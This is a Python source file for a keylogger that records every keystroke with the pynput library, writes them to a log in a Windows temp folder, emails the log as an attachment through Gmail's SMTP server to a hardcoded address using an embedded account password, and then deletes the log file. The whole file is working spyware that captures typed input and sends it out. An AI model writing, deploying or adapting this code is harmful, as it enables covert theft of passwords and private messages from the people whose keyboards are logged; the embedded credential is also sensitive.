from pynput import keyboard

import os

import smtplib 
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 
   

KEY_COUNT_INTERVAL = 10   
LOG_PATH = r"C:\Windows\Temp\Cache\log.txt"
TO_ADDR = "sapkeylogger@gmail.com"
FROM_ADDR = "sapkeylogger@gmail.com"
PASSWORD = "gcez fbre embn xxgk"
    
keys = list()
def onPress(key):  
    global keys
    try:
        # Alphanumeric keys can be printed as chars
        print('{0}'.format(key.char))
        keys.append(str(key.char) + " ")
    except AttributeError:
        # Non-alpanumeric keys are casted to strings
        print('{0}'.format(key))
        keys.append(str(key) + " ")
    finally:
        if len(keys) > 10:
            writeToFile()

def onRelease(key):
    if key == keyboard.Key.esc:
        return False

def writeToFile():
    with open(LOG_PATH, "a") as file:
        for key in keys:
            file.write(key)
        keys.clear()

# Sourced from https://www.geeksforgeeks.org/send-mail-gmail-account-using-python/
def sendEmail():
    
    # Instance of MIMEMultipart 
    msg = MIMEMultipart() 
    
    # Storing the senders email address   
    msg['From'] = FROM_ADDR 
    
    # Storing the receivers email address  
    msg['To'] = TO_ADDR 
    
    # Storing the subject  
    msg['Subject'] = "Keylogger Log"
    
    # String to store the body of the mail 
    body = "Body"

    filename = "log.txt"
    
    # Attach the body with the msg instance 
    msg.attach(MIMEText(body, 'plain')) 
    
    # Open the file to be sent  
    attachment = open(LOG_PATH, "rb") 
    
    # Instance of MIMEBase and named as p 
    p = MIMEBase('application', 'octet-stream') 
    
    # To change the payload into encoded form 
    p.set_payload((attachment).read()) 
    
    # Encode into base64 
    encoders.encode_base64(p) 
    
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
    
    # Attach the instance 'p' to instance 'msg' 
    msg.attach(p) 
    
    # Creates SMTP session 
    s = smtplib.SMTP('smtp.gmail.com', 587) 
    
    # Start TLS for security 
    s.starttls() 
    
    # Authentication 
    s.login(FROM_ADDR, PASSWORD) 
    
    # Converts the Multipart msg into a string 
    text = msg.as_string() 
    
    # Sending the mail 
    s.sendmail(FROM_ADDR, TO_ADDR, text) 
    
    # Terminating the session 
    s.quit() 

# Collect events until released
with keyboard.Listener(
        on_press=onPress, on_release=onRelease) as listener:
    listener.join()

# Send the file to sapkeylogger@gmail.com
sendEmail()

# Clear the log file
os.remove(LOG_PATH)





